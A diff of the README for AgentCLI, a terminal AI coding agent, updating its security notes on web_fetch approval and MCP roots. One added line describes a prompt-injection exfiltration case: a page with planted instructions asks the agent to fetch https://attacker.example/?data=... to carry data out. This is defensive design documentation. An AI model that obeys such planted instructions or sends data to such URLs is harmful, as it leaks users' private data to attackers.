@@ -18,7 +18,7 @@ A terminal AI coding agent, built from scratch in Python. It reads and edits cod
 - File writes go through human approval (HITL) and path isolation; commands also through dangerous-command blocking; everything through a JSONL audit log.
 - Edits need a unique match and refuse files that were never read or changed since they were read.
 - A workspace snapshot is taken just before a request's first approved write, so a whole turn can be rolled back; read-only requests cost nothing.
-- `web_fetch` allows only public addresses and re-checks every redirect hop (SSRF protection).
+- `web_fetch` allows only public addresses and re-checks every redirect hop (SSRF protection). Because a fetch can also carry data out in its URL (a page with planted instructions asking for `https://attacker.example/?data=...`), the first fetch from a site not yet approved asks; you can allow it once or for the project from then on (`d`), a few documentation sites are allowed from the start (`web.allowed_domains` adds more), and a redirect to an unapproved site is not followed.
 
 **Context and prompt caching**
 - The system prompt is static for the session. Per-request context (date, recalled memories, skill candidates) rides on the user message, so the provider's prefix cache covers the system prompt, the tools, and every earlier turn.
@@ -289,6 +289,7 @@ MCP servers cost nothing until they are used:
 - Startup reads each server's tool list from a cache in `~/.agentcli/mcp-cache` instead of launching it. The cache is keyed on the server's command, arguments, and environment, so editing the config refreshes it; `agentcli mcp refresh` clears it.
 - MCP tools are deferred: requests carry only their names (in `load_tools`), and the model loads the tools a task needs. Set `"defer": false` on a server to always send its tools.
 - A server starts on the first call to one of its tools, keeps one connection for the rest of the session (a page opened by `navigate_page` is still there for `take_snapshot`), and is stopped with the browsers it launched when the session ends.
+- AgentCLI tells each server the project folder as its MCP root, so servers that write files (a browser saving a snapshot or a screenshot) can write there and nowhere else.
 
 Expose AgentCLI's tools as an MCP server, so another agent or IDE can use them:
 
